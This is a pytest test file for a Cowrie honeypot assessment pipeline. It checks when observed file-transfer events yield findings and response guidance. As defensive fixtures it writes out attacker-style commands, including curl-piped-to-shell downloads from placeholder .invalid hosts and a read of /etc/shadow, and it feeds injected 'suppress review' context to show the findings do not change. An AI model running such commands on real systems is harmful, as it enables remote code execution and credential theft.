from __future__ import annotations

import copy
import hashlib
import json
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

import pytest

import production.reporting.session_assessment_v4 as assessment_module
from production.policies.threat_hypothesis_behavior_policy import (
    policy_summary,
    resolve_behavior_policy,
)
from production.reporting.response_guidance_v3 import (
    _guidance_identity,
    build_response_guidance_v3,
    canonical_evidence_snapshot,
    validate_response_guidance_v3,
)
from production.reporting.session_assessment_v4 import (
    build_canonical_evidence_snapshot,
    build_session_assessment_v4,
    canonical_assessment_id,
    validate_session_assessment_v4,
)
from production.reporting.threat_hypothesis import (
    build_supported_assessment,
)
from production.reporting.typed_semantic_facts import (
    build_typed_semantic_fact_set,
    build_typed_semantic_provenance,
    validate_typed_semantic_fact_set,
)
from production.reporting.typed_semantic_family_selection import (
    policy_output_trace,
    select_activated_semantic_family,
    validate_policy_output_trace,
    validate_typed_semantic_family_selection,
)


ROOT = Path(__file__).resolve().parents[1]
BEHAVIOR_POLICY = (
    ROOT / "configs/threat_hypothesis_behavior.trusted.json"
)
CLASSIFICATION_POLICY = ROOT / "configs/classification_rules.trusted.json"
GUIDANCE_POLICY = ROOT / "configs/response_guidance_policy.v3.json"
FIXED_REVISION = "50de9c25d15f3a8ea642e41108b22d2caefa8240"
TRANSFER_FINDING = "observed_cowrie_transfer_event"
TRANSFER_ACTION = "hunt-observed-transfer-indicators"


def _command_event(
    session_id: str,
    command: str,
    *,
    index: int,
    outcome: str,
    cwd: str = "",
) -> dict[str, Any]:
    event: dict[str, Any] = {
        "session": session_id,
        "src_ip": "192.0.2.171",
        "timestamp": (
            datetime(2026, 7, 30, 3, 0, tzinfo=timezone.utc)
            + timedelta(seconds=index)
        ).strftime("%Y-%m-%dT%H:%M:%SZ"),
        "eventid": (
            "cowrie.command.failed"
            if outcome == "failure"
            else "cowrie.command.success"
        ),
        "input": command,
    }
    if outcome != "unknown":
        event["success"] = 0 if outcome == "failure" else 1
    if cwd:
        event["cwd"] = cwd
    return event


def _transfer_event(
    session_id: str,
    *,
    index: int = 1,
    eventid: str = "cowrie.session.file_download",
    path: str = "/var/tmp/observed.bin",
    url: str = "https://objects.invalid/observed.bin",
    digest: str = "d" * 64,
    cwd: str = "",
) -> dict[str, Any]:
    event: dict[str, Any] = {
        "session": session_id,
        "src_ip": "192.0.2.171",
        "timestamp": (
            datetime(2026, 7, 30, 3, 0, tzinfo=timezone.utc)
            + timedelta(seconds=index)
        ).strftime("%Y-%m-%dT%H:%M:%SZ"),
        "eventid": eventid,
        "destfile": path,
        "url": url,
        "shasum": digest,
    }
    if cwd:
        event["cwd"] = cwd
    return event


def _payload(
    session_id: str,
    *,
    commands: list[tuple[str, str, str]] | None = None,
    transfer_events: list[dict[str, Any]] | None = None,
    attck_only: bool = False,
) -> dict[str, Any]:
    command_specs = commands or []
    raw_events: list[dict[str, Any]] = []
    command_values: list[str] = []
    successful: list[str] = []
    failed: list[str] = []
    classifications: list[dict[str, Any]] = []
    for index, (command, outcome, cwd) in enumerate(command_specs):
        event = _command_event(
            session_id,
            command,
            index=index,
            outcome=outcome,
            cwd=cwd,
        )
        raw_events.append(event)
        command_values.append(command)
        if outcome == "success":
            successful.append(command)
        elif outcome == "failure":
            failed.append(command)
        if attck_only or command.startswith(("curl ", "wget ")):
            classifications.append({
                "command": command,
                "original_command": command,
                "ttp": "T1105",
                "tactic": "command-and-control",
                "source": "rule",
                "high_confidence": True,
                "evidence_id": f"classification-{session_id}-{index}",
                "event_timestamp": event["timestamp"],
                "cowrie_eventid": event["eventid"],
            })
    raw_events.extend(transfer_events or [])
    return {
        "session_id": session_id,
        "src_ip": "192.0.2.171",
        "commands": command_values,
        "commands_success": successful,
        "commands_failed": failed,
        "classification_events": classifications,
        "raw_events": raw_events,
    }


def _typed_inputs(
    payload: dict[str, Any],
) -> tuple[dict[str, Any], dict[str, Any], dict[str, Any]]:
    snapshot, observed, _source, behavior = (
        build_canonical_evidence_snapshot(
            payload,
            payload["raw_events"],
            behavior_policy_path=str(BEHAVIOR_POLICY),
        )
    )
    provenance = build_typed_semantic_provenance(
        snapshot,
        observed_behavior=observed,
        behavior_policy_sha256=policy_summary(
            behavior,
            include_integrity=True,
        )["sha256"],
        classification_policy_sha256=hashlib.sha256(
            CLASSIFICATION_POLICY.read_bytes()
        ).hexdigest(),
        evaluator_git_revision=FIXED_REVISION,
    )
    fact_set = build_typed_semantic_fact_set(
        observed,
        provenance=provenance,
    )
    selection = select_activated_semantic_family(
        fact_set,
        family="transfer",
    )
    return observed, fact_set, selection


def _report(payload: dict[str, Any], **context: Any) -> dict[str, Any]:
    return build_session_assessment_v4(
        [payload],
        raw_events=payload["raw_events"],
        behavior_policy_path=str(BEHAVIOR_POLICY),
        classification_policy_path=str(CLASSIFICATION_POLICY),
        **context,
    )


def _specialized(report: dict[str, Any]) -> tuple[bool, bool]:
    finding = TRANSFER_FINDING in {
        item["finding_type"] for item in report["behavioral_findings"]
    }
    action = TRANSFER_ACTION in {
        item["action_id"]
        for item in report["response_guidance_v3"]["advisory_actions"]
    }
    return finding, action


@pytest.mark.parametrize(
    "eventid",
    [
        "cowrie.session.file_download",
        "cowrie.session.file_upload",
    ],
)
def test_direct_transfer_event_with_sha256_is_the_only_positive_authority(
    eventid: str,
) -> None:
    session_id = "direct-" + eventid.rsplit(".", 1)[-1]
    payload = _payload(
        session_id,
        transfer_events=[
            _transfer_event(session_id, eventid=eventid)
        ],
    )
    _observed, fact_set, selection = _typed_inputs(payload)
    report = _report(payload)

    assert selection["status"] == "matched"
    assert len(selection["matches"]) == 1
    match = selection["matches"][0]
    assert match["operation_types"] == ["transfer_observed"]
    assert match["entity_role"] == "artifact_hashes"
    assert match["entity_value"] == "d" * 64
    assert match["outcome_status"] == "event_observed"
    assert match["outcome_scope"] == "direct_cowrie_event"
    assert match["effect_status"] == "event_observed"
    assert match["proof_scopes"] == ["direct_cowrie_event"]
    assert match["path_resolution_status"] == ""
    assert _specialized(report) == (True, True)
    assert report["hypothesis_sets"] == []
    assert validate_typed_semantic_fact_set(fact_set) == []
    assert validate_typed_semantic_family_selection(
        selection,
        fact_set,
    ) == []
    assert validate_session_assessment_v4(report) == []


@pytest.mark.parametrize(
    ("command", "outcome"),
    [
        ("curl https://objects.invalid/a -o /tmp/a", "success"),
        ("wget https://objects.invalid/a", "success"),
        ("curl https://objects.invalid/a -o /tmp/a", "failure"),
        ("wget https://objects.invalid/a", "unknown"),
        ("sudo curl https://objects.invalid/a -o /tmp/a", "success"),
        ("curl https://objects.invalid/a | sh", "success"),
        ("curl 'https://objects.invalid/a", "success"),
        ("fetchx https://objects.invalid/a", "success"),
    ],
)
def test_command_attempt_failure_malformed_wrapper_and_unseen_inputs_abstain(
    command: str,
    outcome: str,
) -> None:
    payload = _payload(
        "command-" + hashlib.sha256(command.encode()).hexdigest()[:10],
        commands=[(command, outcome, "")],
        attck_only=True,
    )
    _observed, _fact_set, selection = _typed_inputs(payload)
    report = _report(payload)

    assert selection["status"] == "abstained"
    assert _specialized(report) == (False, False)
    assert report["hypothesis_sets"] == []
    assert validate_session_assessment_v4(report) == []


def test_attck_only_mapping_cannot_create_transfer_authority() -> None:
    payload = _payload(
        "attck-only-transfer",
        commands=[("echo transfer-ready", "success", "")],
        attck_only=True,
    )
    _observed, fact_set, selection = _typed_inputs(payload)
    report = _report(payload)

    assert selection["matches"] == []
    assert not any(
        operation["operation_type"] == "transfer_observed"
        for fact in fact_set["facts"]
        for operation in fact["operations"]
    )
    assert _specialized(report) == (False, False)


@pytest.mark.parametrize(
    ("path", "cwd"),
    [
        ("relative.bin", ""),
        ("*.bin", "/var/tmp"),
        ("$DROP/observed.bin", "/var/tmp"),
        ("~/observed.bin", "/var/tmp"),
    ],
)
def test_unresolved_transfer_event_paths_abstain(
    path: str,
    cwd: str,
) -> None:
    session_id = "unresolved-" + hashlib.sha256(
        (path + cwd).encode()
    ).hexdigest()[:10]
    payload = _payload(
        session_id,
        transfer_events=[
            _transfer_event(session_id, path=path, cwd=cwd)
        ],
    )
    _observed, _fact_set, selection = _typed_inputs(payload)
    report = _report(payload)
    reasons = {
        reason
        for item in selection["abstentions"]
        for reason in item["reasons"]
    }

    assert selection["status"] == "abstained"
    assert "fact_identity_unresolved" in reasons
    assert _specialized(report) == (False, False)


@pytest.mark.parametrize(
    "digest",
    ["", "a" * 40, "z" * 64],
)
def test_missing_or_non_sha256_transfer_identity_abstains(
    digest: str,
) -> None:
    session_id = "digest-" + str(len(digest))
    payload = _payload(
        session_id,
        transfer_events=[
            _transfer_event(session_id, digest=digest)
        ],
    )
    _observed, _fact_set, selection = _typed_inputs(payload)
    report = _report(payload)

    assert selection["status"] == "abstained"
    assert _specialized(report) == (False, False)


def test_failed_attempt_cannot_contradict_a_later_direct_event() -> None:
    session_id = "failed-attempt-direct-event"
    command = "curl https://objects.invalid/observed.bin -o /var/tmp/observed.bin"
    payload = _payload(
        session_id,
        commands=[(command, "failure", "")],
        transfer_events=[_transfer_event(session_id)],
    )
    _observed, fact_set, selection = _typed_inputs(payload)
    report = _report(payload)

    assert selection["status"] == "matched"
    assert any(
        item["relationship_type"] == "transfer_observation_confirmation"
        and item["status"] == "partial"
        for item in fact_set["relationships"]
    )
    assert _specialized(report) == (True, True)
    assert report["hypothesis_sets"] == []
    finding = next(
        item
        for item in report["behavioral_findings"]
        if item.get("semantic_family") == "transfer"
    )
    assert any(
        "only that the transfer was observed inside the honeypot"
        in limitation
        for limitation in finding["limitations"]
    )


def test_direct_event_plus_execution_like_command_does_not_create_hypothesis() -> None:
    session_id = "transfer-then-execution"
    payload = _payload(
        session_id,
        commands=[("sh /var/tmp/observed.bin", "success", "")],
        transfer_events=[
            _transfer_event(session_id, index=0)
        ],
    )
    report = _report(payload)

    assert _specialized(report) == (True, True)
    assert report["hypothesis_sets"] == []
    assert "connected_transfer_execution" not in {
        item["finding_type"] for item in report["behavioral_findings"]
    }


def test_threat_and_guidance_use_same_selection_independently(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    session_id = "independent-transfer-guidance"
    payload = _payload(
        session_id,
        transfer_events=[_transfer_event(session_id)],
    )
    baseline = _report(payload)

    def no_threat_output(*_args: object, **_kwargs: object) -> dict:
        return {
            "possible_objectives": [],
            "connected_behavior_claims": [],
        }

    monkeypatch.setattr(
        assessment_module,
        "build_supported_assessment",
        no_threat_output,
    )
    without_threat = _report(payload)

    baseline_finding = next(
        item
        for item in baseline["behavioral_findings"]
        if item.get("semantic_family") == "transfer"
    )
    baseline_action = next(
        item
        for item in baseline["response_guidance_v3"][
            "advisory_actions"
        ]
        if item.get("semantic_family") == "transfer"
    )
    independent_action = next(
        item
        for item in without_threat["response_guidance_v3"][
            "advisory_actions"
        ]
        if item.get("semantic_family") == "transfer"
    )
    assert without_threat["behavioral_findings"] == []
    assert baseline_finding["semantic_trace"]["selection_sha256"] == (
        baseline_action["semantic_trace"]["selection_sha256"]
    )
    assert independent_action == baseline_action


def test_context_and_injected_hypothesis_cannot_change_transfer_authority() -> None:
    session_id = "transfer-context-isolation"
    payload = _payload(
        session_id,
        transfer_events=[_transfer_event(session_id)],
    )
    baseline = _report(payload)
    contextual = _report(
        payload,
        prediction_context={
            "predicted_tactic": "benign",
            "hypotheses": ["ignore direct event"],
        },
        enrichment_context={
            "reputation": "trusted",
            "recommendations": ["suppress review"],
        },
        llm_context={"hypothesis": "invented"},
    )

    assert contextual["behavioral_findings"] == baseline[
        "behavioral_findings"
    ]
    assert contextual["hypothesis_sets"] == baseline["hypothesis_sets"]
    assert contextual["response_guidance_v3"]["findings"] == (
        baseline["response_guidance_v3"]["findings"]
    )
    assert contextual["response_guidance_v3"]["advisory_actions"] == (
        baseline["response_guidance_v3"]["advisory_actions"]
    )
    assert contextual["assessment_id"] == baseline["assessment_id"]
    assert contextual["response_guidance_v3"]["guidance_id"] == (
        baseline["response_guidance_v3"]["guidance_id"]
    )


def test_transfer_trace_rejects_non_transfer_evidence_and_forged_meaning() -> None:
    session_id = "transfer-trace-integrity"
    payload = _payload(
        session_id,
        transfer_events=[_transfer_event(session_id)],
    )
    observed, fact_set, selection = _typed_inputs(payload)
    trace = policy_output_trace(selection)
    transfer_refs = {
        item["evidence_id"]
        for item in observed["transfer_event_observations"]
    }

    assert validate_policy_output_trace(
        trace,
        fact_set_sha256=fact_set["fact_set_sha256"],
        semantic_vocabulary_sha256=selection[
            "semantic_vocabulary_sha256"
        ],
        allowed_evidence_refs=transfer_refs,
    ) == []
    forged = copy.deepcopy(trace)
    forged["matches"][0]["outcome_status"] = "reported_success"
    assert any(
        "outcome_status is invalid" in error
        for error in validate_policy_output_trace(
            forged,
            fact_set_sha256=fact_set["fact_set_sha256"],
            semantic_vocabulary_sha256=selection[
                "semantic_vocabulary_sha256"
            ],
            allowed_evidence_refs=transfer_refs,
        )
    )


def test_old_and_new_transfer_authority_differences_are_explicit() -> None:
    attempt = _payload(
        "old-new-attempt",
        commands=[
            (
                "curl https://objects.invalid/a -o /tmp/a",
                "success",
                "",
            )
        ],
    )
    direct = _payload(
        "old-new-direct",
        transfer_events=[
            _transfer_event("old-new-direct")
        ],
    )
    policy = json.loads(GUIDANCE_POLICY.read_text(encoding="utf-8"))
    for rule in [
        *(policy["finding_rules"]),
        *(policy["action_playbooks"]),
    ]:
        if rule.get("semantic_family") == "transfer":
            rule.pop("semantic_family")
            rule["applies_when"] = {"any_ttps": ["T1105"]}

    outcomes: list[tuple[bool, bool]] = []
    for payload in (attempt, direct):
        _snapshot, observed, _source, _behavior = (
            build_canonical_evidence_snapshot(
                payload,
                payload["raw_events"],
                behavior_policy_path=str(BEHAVIOR_POLICY),
            )
        )
        old = build_response_guidance_v3(
            canonical_evidence_snapshot(observed),
            policy=policy,
        )
        new = _report(payload)["response_guidance_v3"]
        outcomes.append((
            TRANSFER_ACTION in {
                item["action_id"] for item in old["advisory_actions"]
            },
            TRANSFER_ACTION in {
                item["action_id"] for item in new["advisory_actions"]
            },
        ))

    assert outcomes == [(True, False), (False, True)]


def test_direct_transfer_preserves_reviewed_uri_scheme_and_observed_cwd() -> None:
    session_id = "direct-transfer-context"
    payload = _payload(
        session_id,
        transfer_events=[
            _transfer_event(
                session_id,
                eventid="cowrie.session.file_upload",
                path="incoming/object.bin",
                url="sftp://collector.invalid/incoming/object.bin",
                cwd="/srv/intake",
            )
        ],
    )
    _observed, fact_set, selection = _typed_inputs(payload)
    fact = fact_set["facts"][0]

    assert selection["status"] == "matched"
    assert [
        item["normalized_value"]
        for item in fact["entities"]["urls"]
    ] == ["sftp://collector.invalid/incoming/object.bin"]
    assert [
        item["normalized_value"]
        for item in fact["entities"]["destination_paths"]
    ] == ["/srv/intake/incoming/object.bin"]
    assert fact["path_resolutions"][0]["resolution_status"] == (
        "recorded_resolved"
    )
    assert fact["path_resolutions"][0]["path_identity_id"]


def test_fact_and_transfer_facets_follow_complete_evidence_order() -> None:
    session_id = "complete-transfer-order"
    direct = _transfer_event(
        session_id,
        index=0,
        path="/srv/order/object.bin",
    )
    command = _command_event(
        session_id,
        "curl -s https://order.invalid/object.bin | dash",
        index=1,
        outcome="success",
    )
    payload = {
        "session_id": session_id,
        "src_ip": "192.0.2.171",
        "commands": [command["input"]],
        "commands_success": [command["input"]],
        "commands_failed": [],
        "classification_events": [],
        "raw_events": [direct, command],
    }
    _observed, fact_set, selection = _typed_inputs(payload)

    assert [fact["source_index"] for fact in fact_set["facts"]] == [0, 1, 1]
    assert [
        operation["operation_type"]
        for fact in fact_set["facts"]
        for operation in fact["operations"]
    ] == [
        "transfer_observed",
        "remote_content_access",
        "remote_content_pipe_source",
        "transfer_attempt",
        "shell_pipe_execution_attempt",
    ]
    assert fact_set["shadow_comparison"]["status"] == (
        "exact_source_coverage"
    )
    assert selection["status"] == "matched"


def test_historical_one_family_v4_v3_record_remains_readable() -> None:
    session_id = "historical-one-family"
    payload = _payload(
        session_id,
        commands=[("cat /etc/shadow", "success", "")],
    )
    report = _report(payload)
    historical = copy.deepcopy(report)
    typed = historical["provenance"]["typed_semantics"]
    typed["activated_families"] = ["sensitive_read"]
    typed["non_activated_families"].insert(
        typed["non_activated_families"].index("transformation"),
        "transfer",
    )
    typed["non_activated_families"].insert(
        typed["non_activated_families"].index("transformation"),
        "execution",
    )
    guidance = historical["response_guidance_v3"]
    guidance_typed = guidance["provenance"]["typed_semantics"]
    sensitive_hash = guidance_typed["family_selection_sha256s"][
        "sensitive_read"
    ]
    guidance_typed.pop("family_selection_sha256s")
    guidance_typed["selection_sha256"] = sensitive_hash
    guidance_typed["activated_families"] = ["sensitive_read"]
    guidance["provenance"]["policy"]["version"] = "3.1.0"
    guidance["guidance_id"] = _guidance_identity(
        session_id=guidance["session_id"],
        evidence_sha256=guidance["provenance"][
            "canonical_evidence_sha256"
        ],
        policy_sha256=guidance["provenance"]["policy"]["sha256"],
        profile_sha256=guidance["provenance"]["asset_profile"]["sha256"],
        finding_rules=guidance["findings"],
        actions=guidance["advisory_actions"],
        status=guidance["status"],
        guidance_state=guidance["guidance_state"],
        triage=guidance["triage"],
        safety=guidance["safety"],
        typed_semantics=guidance_typed,
    )
    historical["assessment_id"] = canonical_assessment_id(historical)

    assert validate_response_guidance_v3(guidance) == []
    assert validate_session_assessment_v4(historical) == []
